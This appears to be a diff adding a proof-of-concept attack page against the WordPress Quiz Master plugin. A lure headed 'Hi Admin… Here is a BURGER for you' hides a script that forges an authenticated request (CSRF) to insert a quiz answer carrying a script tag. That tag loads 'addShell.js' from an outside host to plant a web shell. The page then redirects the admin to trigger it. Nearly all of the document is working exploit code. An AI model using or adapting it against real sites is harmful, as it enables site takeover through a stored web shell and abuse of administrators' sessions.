@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+    <head>
+        <title>Burger!</title>
+        <link rel="icon" type="image/x-icon" href="https://arian-lrd.github.io/public-resources/quiz-master-4.7.7/favicon-burger.png">
+    </head>
+
+    <style>
+        body {
+            background-color: rgb(76, 73, 73);
+            
+        }
+
+        #welcomeMessage {
+            color: rgb(171, 45, 45);
+            background-color: rgba(255, 255, 255, 0.793);
+            font-family: cursive;
+            font-style: bold;
+            text-align: center;
+            font-size: 250%;
+        }
+
+        #youTubeVideo {
+            display: block;
+            width: 1120px;
+            height: 630px;
+            margin: 0 auto;
+            
+        }
+    </style>
+<body>
+    <h4 id="welcomeMessage">Hi Admin, you must be very tired. </br>Here is a BURGER for you</h4>
+    
+    <p style="display: none;">Ha Ha Ha, Who gives out free burgers in this economy?</p>
+
+    <iframe id="youTubeVideo" 
+        width="560" height="315" src="https://www.youtube.com/embed/OBd3ye1d14k?si=wVFa_Jx5UkTQ9wGB&amp;controls=0&amp;start=20892&amp;autoplay=1&amp;mute=1" 
+        title="YouTube video player" frameborder="0"  allow="autoplay"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" r
+        eferrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
+    </iframe>
+
+</body>
+
+
+
+
+<script>
+    //1. Extract quizID & quizName from the publicly visible page of the quiz
+    let quizID=2;
+    let quizName='york-exam'
+
+    //2. Create the new question form data
+    let payload = new URLSearchParams({
+        question_type: '0',
+        question_name: 'HACKED',
+        correct_answer_info: '',
+        hint: '',
+        answer_1: '<script src="https://arian-lrd.github.io/public-resources/quiz-master-4.7.7/addShell.js"><\/script>',
+        answer_1_points: '0',
+        comments: '1',
+        new_question_order: '1',
+        required: '0',
+        new_category: '', 
+        new_question_answer_total: '1',
+        question_submission: 'new_question',
+        quiz_id: quizID,
+        question_id: '0'
+
+    })
+    //3. Send the create new question request 
+    //   Will work because of the CSRF vulnerability
+    fetch(`http://localhost:8000/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=${quizID}`, {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: payload.toString()
+    }).finally(()=> {
+    //4. After injectig the quiz page with malicious JS, navigate to that page
+    //   This will cause the injected JS & Web Shell execute immediately
+    //   Alternatively - Exclude this and wait for the admin to visit the quiz page
+        setTimeout(() => {
+            //visit malicious quiz to execute the payload
+            window.location.href= `http://localhost:8000/?quiz=${quizName}`
+        }, 10000); //wait for 10 seconds
+    });
+
+</script>
+
